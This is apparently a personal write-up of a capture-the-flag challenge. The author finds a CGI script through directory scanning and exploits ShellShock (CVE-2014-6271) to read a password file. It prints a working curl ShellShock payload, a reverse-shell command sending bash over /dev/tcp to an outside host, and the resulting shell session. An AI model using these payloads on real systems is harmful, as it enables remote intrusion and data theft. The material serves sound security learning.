# Rhymes with: Smell Sock

## Problem

The file smellsock.txt on the host https://smelly.plexhax.com contains the password to unzip the attached zip file.

## Links

* https://smelly.plexhax.com/

## Notes

This prompt sounds like its implying that if I know where the file is on the system, I can path to it in the URL and download it.  The site shows off a the debug page for an Apache web server, this baits the idea that this site is a simple Apache server not locked down.  This means that config settings, random text files in /var/www, etc can all be found if we know the file paths, and the names of the files.  Some common names of files for an Apache web server can be.

* .htaccess
* robots.txt
* .DN_Store (if it's a Mac)

In this case, the .htaccess file is present, but the server forbids us from viewing it.  So far no file, including smellsock.txt can be found, and this may play into the name of the CTF, the name of the file is a rhyme of smell sock.  I could create a list of words that rhyme with smell and sock, but this would be a very manual way of solving this problem.

### Gobuster

[Gobuster Tutorial](https://hackertarget.com/gobuster-tutorial/) may be a way to solve this problem.  I have heard of Gobuster before when doing a similar problem on PicoCTF, but the CTF was found in one of the common files listed above.  Gobuster is aggressive, and it could be way to brutish on its own to warrant using it for this puzzle.  But we could make it less aggressive by providing it the word list we create made up of words that rhyme with smell and sock.  Providing that ourselves, it justifies the use of Gobuster as a tool that handles the repetition of iterating through the word list.

Plus how many times are you given the opportunity to try out these tools *legally*, it's good practice.

### Dirb

Gobuster came out after Dirb, but makes reference to it.  I found another write up on scanning sites and it used dirb for looking for files on a web server.  So best to try this one out as well.  I figure I will kick of Dirb and let that find any common directories of files.  While that is running I'll start building a script to get a list of words that rhyme with smellsock.  If Dirb passes before I get this script completed I won't have to make this custom script.  But if it fails we will use this script to build the word list, and then use that with Dirb or Gobuster.

### Dirb common word list scan

```bash
cwright@cam-xps:~/Documents/plexhax-ctf/rhymes-with-smell-sock$ dirb https://smelly.plexhax.com/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Aug  4 17:24:11 2022
URL_BASE: https://smelly.plexhax.com/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://smelly.plexhax.com/ ----
+ https://smelly.plexhax.com/cgi-bin/ (CODE:403|SIZE:293)                                           
+ https://smelly.plexhax.com/index.html (CODE:200|SIZE:11510)                                       
+ https://smelly.plexhax.com/server-status (CODE:403|SIZE:298)                                      
                                                                                                    
-----------------
```

This scan missed files like .htaccess, but did reveal that **cgi-bin** directory does exist.

Something to note is if you look at the html source of index.html, its using a very old version of Apache, last updated in 2014.  I don't think this challenge needs to use an exploit against Apache in the 8 years since, but it should be kept in mind.  Another thing that looking at the source reveled is that a directory **/icons/** does exist, its where the Ubuntu logo is found.

Been duped, the web page says Apache but the header for all the requests say nginx.  Or this should mean that Apache is behind a reverse proxy nginx.

### Hint

The first hint mentions that the file /cgi-bin/admin.cgi exists, the contents of this file just says "w00t".

Using the command didn't turn up any results.

```bash
dirb https://smelly.plexhax.com/icons/ ./smellsock.txt -x /usr/share/dirb/wordlists/extensions_common.txt
```

Though the hint might reinforce the solution that the file is found in other directories located on the web server.  Mainly /icons/.

So far the scan of the /icons/ directory isn't turning up anything.

### Hint 2

The second hint provides a link to https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271, an article talking about an exploit for doing remote code execution.  The exploit effects mod_cgi for apache from 2014.  The index.html did lead on earlier that this apache webserver was running a version from 2014.  Now the next task is learning how to do this exploit.

### ShellShock

The exploit is [ShellShock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), a bug that allows remote code execution through the bash shell.  My first idea is to refactor some Python2 code demonstrating how to get a reverse shell.  This code gained from a [link in the original hint.](https://packetstormsecurity.com/files/128573/Apache-mod_cgi-Remote-Command-Execution.html) is clear on how the socket and connection is built.  Sadly I can't get it to work as the http request send to the server hangs.  This may be how the server is interpreting the bash command to open a netcat connection back to my computer.  My computer is left waiting with no response.

Here is a following article on using this exploit, [Exploiting a Shellshock Vulnerability](https://www.infosecarticles.com/exploiting-shellshock-vulnerability/).

#### Nikto

The article first mentions using nikto to scan the website for the cgi\_mod and shellshock exploit.  Article [Web Server Scanning With Nikto – A Beginner's Guide](https://www.freecodecamp.org/news/an-introduction-to-web-server-scanning-with-nikto/) on using it.  Nikto didn't find cgi\_mod on its own, it took using dirb with nikto to find this directory; having multiple reconnaissance tools improves success in these challenges.  Nikto also is taking much longer to report back on the cgi\_mod directory, and now that I know that remote code execution is possible, I don't need nikto to scan.  Here is the command I would use though it should be reevaluated only to scan for cgi\_mod, I think its doing to much.

```bash
$ nikto -h https://smelly.plexhax.com -C /cgi-bin/ -ssl
```

#### Curl Remote Code Exec

From the article there is an example of using curl to check for the ShellShock vulnerability. Using this on smelly.plexhax.com this is the result

```bash
$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" https://smelly.plexhax.com/cgi-bin/admin.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This did work, and showed that remote code execution is possible.  Have netcat listen on port 9001, and port forward my route will allow me to listen to this server for a tpc connection.  Using the code below should allow us to open a reverse shell, ~~but running it results in a gateway timeout~~.

```bash
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
```

```bash
$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/externalIP/9001 0>&1' https://smelly.plexhax.com/cgi-bin/admin.cgi  
<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

~~This timeout could be that /dev/tcp doesn't exist, or there are some permissions locking this down.~~  The timeout was because while I was correctly port forwarding my router, my laptop had ufw enabled, and so my OS was blocking port 9001.  Turning off ufw for this allowed me to connect.  Here is a rundown of the bash session.

```bash
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 18.225.19.172 38366
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@7f8a9ef9d055:/usr/lib/cgi-bin$ ls
ls
admin.cgi
www-data@7f8a9ef9d055:/usr/lib/cgi-bin$ who
who
www-data@7f8a9ef9d055:/usr/lib/cgi-bin$ w
w
 18:08:40 up 58 days,  2:11,  0 users,  load average: 0.26, 0.12, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
www-data@7f8a9ef9d055:/usr/lib/cgi-bin$ ls
ls
admin.cgi
www-data@7f8a9ef9d055:/usr/lib/cgi-bin$ cat admin.cgi
cat admin.cgi
#!/usr/local/bin/bash
echo "Content-type: text/html"
echo ""
echo "w00t"
www-data@7f8a9ef9d055:/usr/lib/cgi-bin$ cd ..
cd ..
www-data@7f8a9ef9d055:/usr/lib$ ls
ls
apache2
...
x86_64-linux-gnu
www-data@7f8a9ef9d055:/usr/lib$ locate smellsock.txt
locate smellsock.txt
bash: locate: command not found
www-data@7f8a9ef9d055:/usr/lib$ find / -name smellsock.txt
find / -name smellsock.txt
find: `/proc/tty/driver': Permission denied
...
find: `/root': Permission denied
/smellsock.txt
www-data@7f8a9ef9d055:/usr/lib$ cat /smellsock.txt
cat /smellsock.txt
zip file password: bingie_car_horse_driver_day
www-data@7f8a9ef9d055:/usr/lib$ ^C
```

Second reverse shell info

- user: www-data
- Is not in wheel group
- server not running samba
- server not mounted to network share
- eth0 ip address is 172.17.0.5

As shown, the smellsock.txt was located with the find command.  At first I did want to see if anyone else was on the system while I was on, but it seems that this method results in who & w being empty.  Using the commands `last` or checking the bash history of the user may have shown more info, but my goal wasn't to analyze the server but get the text file.

The command `find` quickly found the smellsock.txt file, located in the root dir.  Inside the file is the password for the zip file.

### ZIP file

Using the password bingie\_car\_horse\_driver\_day on the zipfile, one file is uncompressed "nessus\_ctf.nessus.  This is a very very large XML file, that looks to be a exported report from Nessus on a Internal Network Scan.  I have never used or heard of Nessus.  Also `grep` for the flag doesn't show any CTF phrase present.

The file is large, and the ips listed in here don't match the ip of the smelly.plexhax.com site.  Though smelly.plexhax.com does have a reverse proxy.  I could reverse shell back onto the machine to get its IP, but I started looking through the nessus report.  It's large but I focused on the parts mentioning the largest security vulnerabilities.  The one that stuck out was "Signing is disabled on the remote SMB server.  This can allow man-in-the-middle attacks against the SMB server."

nmap shows the port is open

```bash
$ nmap smelly.plexhax.com -p 445
starting Nmap 7.80 ( https://nmap.org ) at 2022-08-07 12:57 MDT
Nmap scan report for smelly.plexhax.com (18.225.19.172)
Host is up (0.076s latency).
rDNS record for 18.225.19.172: ec2-18-225-19-172.us-east-2.compute.amazonaws.com

PORT    STATE    SERVICE
445/tcp filtered microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
```

Trying to mount this directory results in this,

```bash
$ sudo mount -t cifs //smelly.plexhax.com  ./smelly -v
Password for root@//smelly.plexhax.com:  (press TAB for no echo)
```

I don't know which user to use, and I don't know that users password.  I tried using the same password as the zip file but no luck.  I might need to reverse shell back onto the system to find out what user it is.

There is also port 3389 open.  This is the Windows Remote Desktop, and the XML file mentions that this server is not signing so is susceptible to man in the middle attacks.

### Flag

The solution was the unzipped Nessues file, not anything to do with the contents.  The solution to the challenge was to upload that XML file.

## Solution

Viewing the static HTML the first clue is that this Apache server is out of date, version from 2014.  The second clue is by doing either a combination of CLI tools `dirb` and `nikto` you could figure out that the /bin-cgi/admin.cgi file exists.  Knowing that this server is running a 2014 version of Apache and Apache has mod\_cgi enabled.  The ShellSock vulnerability is present.  To try this out the **ShellSock section** above shows steps and code examples of executing this exploit.  With shell access to the system, using the `find` command found the smellsock.txt in seconds.  The file contained the password to the zip file.


Answer
